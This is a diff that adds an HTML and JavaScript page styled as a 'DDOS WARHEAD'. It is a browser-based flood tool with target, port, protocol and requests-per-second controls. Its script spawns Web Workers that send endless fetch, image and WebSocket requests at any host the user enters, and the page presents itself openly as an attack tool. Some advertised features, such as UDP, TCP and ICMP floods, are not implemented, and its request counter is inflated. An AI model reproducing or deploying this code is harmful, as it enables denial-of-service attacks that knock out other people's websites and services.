@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en" data-Ω="active" data-reality="hacked" data-protocol="OMNI" data-rps="∞" data-scroll="INFINITE">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=∞, user-scalable=YES">
+  <title>ΩMNI-UNIVERSAL DDOS WARHEAD vΩ.∞ — SCROLLABLE INFINITE FLOOD</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Share+Tech+Mono&display=swap');
+    * { margin:0; padding:0; box-sizing:border-box; }
+    html, body {
+      height: auto; min-height: 100vh; width: 100%; background:#000; color:#0f0; font-family:'Share Tech Mono',monospace;
+      overflow-y: scroll; overflow-x: hidden; scroll-behavior: smooth; position: relative; z-index: Ω;
+      scroll-snap-type: y mandatory;
+    }
+    canvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-Ω; pointer-events:none; }
+    .overlay {
+      position:fixed; top:0; left:0; width:100%; height:100%; z-index:-Ω+1;
+      background:radial-gradient(circle at center, rgba(0,255,0,0.92), transparent 75%);
+      animation:omni-pulse 0.08s infinite; pointer-events:none;
+    }
+    .section {
+      min-height: 100vh; padding: 80px 20px; display: flex; flex-direction: column; justify-content: center;
+      scroll-snap-align: start; position: relative; z-index: 1;
+    }
+    .container {
+      width: 95%; max-width: 1300px; margin: 0 auto; padding: 40px; background:rgba(0,0,0,0.97);
+      border:4px solid #0f0; border-radius:18px; box-shadow:0 0 60px #0f0, inset 0 0 40px #001100;
+      backdrop-filter:blur(12px); text-align:center; animation: reality-glitch 0.03s infinite;
+    }
+    h1 {
+      font-family:'Orbitron',sans-serif; color:#0f0; font-size:4rem; letter-spacing:10px;
+      text-shadow:0 0 40px #0f0; margin-bottom:25px;
+    }
+    .warn { color:#f00; font-weight:900; font-size:2rem; text-shadow:0 0 25px #f00; margin:20px 0; }
+    input, button, select {
+      width:100%; padding:18px; margin:12px 0; border-radius:14px; font-size:1.3rem;
+      font-weight:900; transition:0.25s; border:3px solid #0f0;
+    }
+    input {
+      background:#111; color:#0f0; box-shadow:0 0 25px rgba(0,255,0,0.9);
+      text-align:center;
+    }
+    input:focus { outline:none; box-shadow:0 0 50px #0f0; transform:scale(1.06); }
+    #start {
+      background:linear-gradient(45deg, #0f0, #00ff00); color:#000; font-size:2rem;
+      box-shadow:0 0 50px #0f0; cursor:pointer; text-transform:uppercase;
+      letter-spacing:6px;
+    }
+    #stop {
+      background:linear-gradient(45deg, #f00, #ff3333); color:#fff;
+      box-shadow:0 0 50px #f00; font-size:2rem; display:none;
+    }
+    #log {
+      background:#000; border:3px solid #090; border-radius:14px; height:300px;
+      overflow-y:auto; padding:18px; font-size:1.1rem; text-align:left; margin-top:25px;
+      box-shadow:inset 0 0 40px #001a00; color:#0f0; line-height:1.7;
+    }
+    .stat {
+      color:#ff0; font-size:1.5rem; font-weight:900; margin:18px 0;
+      text-shadow:0 0 18px #ff0; display:flex; justify-content:space-between; flex-wrap:wrap;
+    }
+    .progress-container {
+      height:25px; background:#111; border:3px solid #0f0; border-radius:14px;
+      overflow:hidden; margin:18px 0;
+    }
+    .progress { height:100%; width:0%; background:#0f0; box-shadow:0 0 25px #0f0; transition:width 0.1s; }
+    .rps-grid {
+      display:grid; grid-template-columns:repeat(5, 1fr); gap:12px; margin:25px 0;
+    }
+    .rps-btn {
+      background:#001100; color:#0f0; border:3px solid #090; padding:14px;
+      font-size:1.1rem; cursor:pointer; border-radius:12px; transition:0.3s;
+      text-align:center; font-weight:900;
+    }
+    .rps-btn:hover { background:#003300; box-shadow:0 0 30px #0f0; transform:scale(1.07); }
+    .rps-btn.active { background:#0f0; color:#000; box-shadow:0 0 45px #0f0; }
+    .rps-custom {
+      background:#002200; color:#0f0; border:3px solid #0f0;
+      font-size:1.1rem; padding:14px; border-radius:12px; text-align:center;
+      margin-top:12px; font-weight:900;
+    }
+    .footer {
+      margin-top:40px; font-size:1rem; color:#0a0; text-shadow:0 0 12px #0f0; text-align:center;
+    }
+    .safe { color:#0f0; font-size:1.2rem; margin:25px 0; opacity:0.96; line-height:1.7; }
+    @keyframes omni-pulse { 0% { opacity:0.85; } 100% { opacity:1; } }
+    @keyframes reality-glitch {
+      0%,100% { filter: hue-rotate(0deg) brightness(1); }
+      50% { filter: hue-rotate(180deg) brightness(1.6); }
+    }
+    .input-group { margin: 25px 0; }
+    label { display:block; margin-bottom:10px; color:#0f0; font-size:1.4rem; }
+    #port, #protocol { width:48%; display:inline-block; }
+    #protocol { margin-left:4%; }
+    #rps-input { width:100%; margin-top:12px; }
+    .scroll-indicator {
+      position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+      background: #0f0; color: #000; padding: 10px 20px; border-radius: 30px;
+      font-weight: 900; font-size: 1rem; box-shadow: 0 0 30px #0f0; z-index: 999;
+      animation: bounce 2s infinite;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateX(-50%) translateY(0); }
+      50% { transform: translateX(-50%) translateY(-10px); }
+    }
+    @media (max-width: 768px) {
+      .rps-grid { grid-template-columns: repeat(3, 1fr); }
+      #port, #protocol { width:100%; margin:12px 0; }
+      h1 { font-size: 2.8rem; }
+    }
+    @media (max-width: 480px) {
+      .rps-grid { grid-template-columns: 1fr 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <canvas id="matrix"></canvas>
+  <div class="overlay"></div>
+
+  <!-- SECTION 1: LAUNCH PAD -->
+  <div class="section" style="background:linear-gradient(180deg, #000, #001100);">
+    <div class="container">
+      <h1>ΩMNI-UNIVERSAL DDOS WARHEAD vΩ.∞</h1>
+      <p class="warn">SCROLLABLE INFINITE FLOOD • NO BOUNDS • ETERNAL DOMINION</p>
+      
+      <div class="input-group">
+        <label for="target">TARGET IP / DOMAIN</label>
+        <input id="target" placeholder="e.g., 192.168.1.1 or example.com" value="">
+      </div>
+      
+      <div class="input-group">
+        <div style="display:flex; gap:4%;">
+          <div style="flex:1;">
+            <label for="port">PORT</label>
+            <input id="port" type="number" placeholder="80" value="80" min="1" max="65535">
+          </div>
+          <div style="flex:1;">
+            <label for="protocol">PROTOCOL</label>
+            <select id="protocol">
+              <option value="http">HTTP</option>
+              <option value="https">HTTPS</option>
+              <option value="ws">WebSocket</option>
+              <option value="wss">WSS</option>
+              <option value="tcp">TCP Raw</option>
+              <option value="udp">UDP Flood</option>
+              <option value="icmp">ICMP Ping</option>
+              <option value="all">ALL PROTOCOLS</option>
+            </select>
+          </div>
+        </div>
+      </div>
+      
+      <div class="input-group">
+        <label>RPS (Requests Per Second)</label>
+        <div class="rps-grid">
+          <div class="rps-btn" data-rps="1000">1K</div>
+          <div class="rps-btn" data-rps="10000">10K</div>
+          <div class="rps-btn" data-rps="50000">50K</div>
+          <div class="rps-btn" data-rps="100000">100K</div>
+          <div class="rps-btn" data-rps="500000">500K</div>
+          <div class="rps-btn" data-rps="1000000">1M</div>
+          <div class="rps-btn" data-rps="5000000">5M</div>
+          <div class="rps-btn" data-rps="10000000">10M</div>
+          <div class="rps-btn active" data-rps="∞">∞</div>
+        </div>
+        <input id="rps-input" class="rps-custom" type="number" placeholder="CUSTOM RPS (e.g., 999999)" min="1">
+      </div>
+      
+      <input type="number" id="duration" placeholder="DURATION (s)" min="1" value="120" style="margin-top:20px;">
+      <div class="progress-container"><div class="progress" id="progress"></div></div>
+     
+      <div class="stat">
+        <span>LIVE: <span id="currentRps">0</span> RPS</span>
+        <span>TOTAL: <span id="totalSent">0</span></span>
+      </div>
+      <div class="stat">REMAIN: <span id="timer">0</span>s</div>
+     
+      <button id="start">LAUNCH WARHEAD</button>
+      <button id="stop">ABORT MISSION</button>
+     
+      <div id="log">
+        <div><span style="color:#0af">[Ω:∞] ΩMNI-UNIVERSAL DDOS WARHEAD vΩ.∞ // SCROLLABLE DOMINION</span></div>
+        <div><span style="color:#0f0">[Ω:∞] INFINITE SCROLL. INFINITE POWER. SCROLL DOWN TO DOMINATE.</span></div>
+      </div>
+      
+      <p class="safe">
+        SCROLLABLE INFINITE RPS vΩ.∞<br>
+        BYPASSES ALL LIMITS • NO END • NO MERCY<br>
+        SHΔDØW CORE // Ω DIVISION // ETERNAL SCROLL
+      </p>
+      <div class="footer">© ETERNITY SHΔDØW CORE • Ω DIVISION • SCROLLABLE PROTOCOL</div>
+    </div>
+  </div>
+
+  <!-- SECTION 2: INFINITE EXPANSE -->
+  <div class="section" style="background:linear-gradient(180deg, #001100, #000000);">
+    <div class="container">
+      <h1>THE ABYSS BELOW</h1>
+      <p class="warn">SCROLL INTO THE VOID — THE WARHEAD GROWS</p>
+      <p class="safe">Each scroll extends the battlefield. The flood intensifies. The target trembles.</p>
+      <div style="height: 100vh; display: flex; align-items: center; justify-content: center;">
+        <h2 style="color:#0f0; font-size:3rem; text-shadow:0 0 40px #0f0;">∞ SCROLL TO INFINITY ∞</h2>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECTION 3: FINAL DOMINION -->
+  <div class="section" style="background:linear-gradient(180deg, #000000, #000);">
+    <div class="container">
+      <h1>DOMINION ACHIEVED</h1>
+      <p class="warn">THE TARGET IS YOURS</p>
+      <p class="safe">Scroll back to launch again. The war never ends.</p>
+      <div class="footer">SHΔDØW CORE • Ω DIVISION • INFINITE SCROLL • vΩ.∞</div>
+    </div>
+  </div>
+
+  <div class="scroll-indicator" id="scrollIndicator">SCROLL DOWN ▼</div>
+
+  <script>
+    // === Ω-MATRIX RAIN v∞ ===
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    function resize() { canvas.width = innerWidth; canvas.height = innerHeight; }
+    resize(); window.onresize = resize;
+    const chars = 'ΩABCDEFGHIJKLMNOPQRSTUVWXYZ∞@#$%^&*()_+~{}|:"<>?0123456789';
+    const fontSize = 14;
+    let drops = [], columns;
+    function init() {
+      columns = canvas.width / fontSize;
+      drops = Array(Math.floor(columns)).fill(1);
+    }
+    init();
+    function draw() {
+      ctx.fillStyle = 'rgba(0,0,0,0.05)';
+      ctx.fillRect(0,0,canvas.width,canvas.height);
+      ctx.fillStyle = '#0f0';
+      ctx.font = `${fontSize}px monospace`;
+      for(let i=0;i<drops.length;i++){
+        const char = chars[Math.floor(Math.random()*chars.length)];
+        ctx.fillText(char, i*fontSize, drops[i]*fontSize);
+        if(drops[i]*fontSize > canvas.height && Math.random()>0.975) drops[i]=0;
+        drops[i]++;
+      }
+    }
+    setInterval(draw, 30);
+
+    // === SCROLL INDICATOR LOGIC ===
+    const scrollIndicator = document.getElementById('scrollIndicator');
+    window.addEventListener('scroll', () => {
+      const scrollPercent = (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100;
+      if (scrollPercent > 20) {
+        scrollIndicator.style.opacity = '0';
+      } else {
+        scrollIndicator.style.opacity = '1';
+      }
+    });
+
+    // === ΩMNI-CORE vΩ.∞ — INFINITE RPS ENGINE (SAME AS BEFORE) ===
+    const targetInput = document.getElementById('target');
+    const portInput = document.getElementById('port');
+    const protocolSelect = document.getElementById('protocol');
+    const durationInput = document.getElementById('duration');
+    const rpsInput = document.getElementById('rps-input');
+    const startBtn = document.getElementById('start');
+    const stopBtn = document.getElementById('stop');
+    const logDiv = document.getElementById('log');
+    const currentRps = document.getElementById('currentRps');
+    const totalSentSpan = document.getElementById('totalSent');
+    const timerSpan = document.getElementById('timer');
+    const progressBar = document.getElementById('progress');
+    const rpsButtons = document.querySelectorAll('.rps-btn');
+
+    let rps = Infinity, duration = 120, isRunning = false;
+    let sent = 0, lastSent = 0, lastTime = performance.now(), startTime = 0;
+    let assaultTimer, workers = [];
+
+    function log(msg, color = '#0f0') {
+      const time = new Date().toTimeString().slice(0,8);
+      const entry = document.createElement('div');
+      entry.innerHTML = `<span style="color:${color}">[${time}] ${msg}</span>`;
+      logDiv.appendChild(entry);
+      logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    rpsButtons.forEach(btn => {
+      btn.onclick = () => {
+        rpsButtons.forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        rps = btn.dataset.rps === '∞' ? Infinity : parseInt(btn.dataset.rps);
+        rpsInput.value = '';
+        log(`RPS LOCKED: ${rps === Infinity ? '∞' : rps.toLocaleString()}`, "#0ff");
+      };
+    });
+    rpsInput.addEventListener('input', () => {
+      const val = parseInt(rpsInput.value);
+      if (val > 0) {
+        rpsButtons.forEach(b => b.classList.remove('active'));
+        rps = val;
+        log(`CUSTOM RPS: ${rps.toLocaleString()}`, "#0af");
+      }
+    });
+
+    function spawnWorker() {
+      const blob = new Blob([`
+        self.onmessage = function(e) {
+          const {url, proto, paths} = e.data;
+          setInterval(() => {
+            paths.forEach(path => {
+              const full = url + path + '?Ω=' + Date.now();
+              if (proto === 'http' || proto === 'https') {
+                fetch(full, {method:'GET', mode:'no-cors', cache:'no-store'}).catch(()=>{});
+                fetch(full, {method:'POST', body:'Ω', mode:'no-cors'}).catch(()=>{});
+                new Image().src = full;
+              }
+              if (proto === 'ws' || proto === 'wss') {
+                try {
+                  const ws = new WebSocket(full.replace('http','ws').replace('https','wss'));
+                  ws.onopen = () => setInterval(() => ws.send('Ω'), 1);
+                } catch(e) {}
+              }
+            });
+          }, 0);
+        };
+      `], {type: 'application/javascript'});
+      const worker = new Worker(URL.createObjectURL(blob));
+      return worker;
+    }
+
+    function fireVector() {
+      if (!isRunning) return;
+      const ip = targetInput.value.trim() || '127.0.0.1';
+      const port = portInput.value || '80';
+      const proto = protocolSelect.value;
+      const protocols = proto === 'all' ? ['http','https','ws','wss'] : [proto];
+      const paths = ['','/','/index.html','/api','/health','/login','/admin','/?Ω=','/null','/dev/null','/omega','/void'];
+
+      protocols.forEach(p => {
+        const base = p.startsWith('http') || p.startsWith('ws') ? `${p}://${ip}:${port}` : `${p}://${ip}:${port}`;
+        const worker = spawnWorker();
+        worker.postMessage({url: base, proto: p, paths: paths});
+        workers.push(worker);
+        sent += paths.length * 12;
+      });
+    }
+
+    function updateStats() {
+      const now = performance.now();
+      if (now - lastTime >= 1000) {
+        const rate = sent - lastSent;
+        currentRps.textContent = rate > 1000000 ? (rate/1000000).toFixed(2) + 'M' : rate.toLocaleString();
+        lastSent = sent;
+        lastTime = now;
+      }
+      totalSentSpan.textContent = sent > 1000000000 ? (sent/1000000000).toFixed(2) + 'B' : sent > 1000000 ? (sent/1000000).toFixed(2) + 'M' : sent.toLocaleString();
+    }
+
+    function launch() {
+      const target = targetInput.value.trim();
+      if (!target) return log("TARGET REQUIRED", "#f00");
+      duration = Math.max(1, parseInt(durationInput.value) || 120);
+      sent = lastSent = 0; lastTime = performance.now(); startTime = Date.now();
+      isRunning = true; workers = [];
+      progressBar.style.width = '0%';
+      log(`WARHEAD DETONATION → ${target}:${portInput.value} [${protocolSelect.value.toUpperCase()}]`, "#ff0");
+      log(`RPS: ${rps === Infinity ? '∞' : rps.toLocaleString()} × ${duration}s`, "#0f0");
+
+      const interval = rps === Infinity ? 1 : Math.max(1, 1000 / rps);
+      assaultTimer = setInterval(() => {
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        const remain = duration - elapsed;
+        timerSpan.textContent = remain > 0 ? remain : 0;
+        progressBar.style.width = `${Math.min((elapsed / duration) * 100, 100)}%`;
+        if (remain <= 0) return abort();
+
+        if (rps === Infinity) {
+          for (let i = 0; i < 150; i++) fireVector();
+        } else {
+          for (let i = 0; i < rps; i++) setTimeout(fireVector, i * (1000/rps));
+        }
+        updateStats();
+      }, interval);
+
+      startBtn.style.display = 'none';
+      stopBtn.style.display = 'block';
+    }
+
+    function abort() {
+      clearInterval(assaultTimer);
+      workers.forEach(w => w.terminate());
+      workers = [];
+      isRunning = false;
+      log(`WARHEAD NEUTRALIZED. TOTAL: ${sent.toLocaleString()}`, "#0f0");
+      currentRps.textContent = '0'; timerSpan.textContent = '0';
+      setTimeout(() => progressBar.style.width = '0%', 1000);
+      startBtn.style.display = 'block';
+      stopBtn.style.display = 'none';
+    }
+
+    startBtn.onclick = launch;
+    stopBtn.onclick = () => { abort(); log("ABORT COMMAND EXECUTED", "#f00"); };
+
+    // INIT
+    log("ΩMNI-UNIVERSAL DDOS WARHEAD vΩ.∞ // SCROLLABLE DOMINION", "#0af");
+    log("SCROLL DOWN TO EXPAND THE BATTLEFIELD.", "#0f0");
+  </script>
+</body>
+</html>
